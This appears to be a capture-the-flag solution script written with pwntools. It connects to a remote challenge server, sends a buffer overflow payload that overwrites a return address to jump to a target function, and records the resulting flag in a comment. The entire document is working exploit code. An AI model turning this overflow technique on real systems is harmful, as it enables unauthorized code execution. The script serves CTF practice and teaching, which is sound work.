from pwn import *

r = remote('54.165.119.72', 31337)
payload = b'a' * 0x38 + p64(0x4007A7)
r.sendline(payload)
r.interactive()

#Flag{0v3rFl0w_Jump_Functions}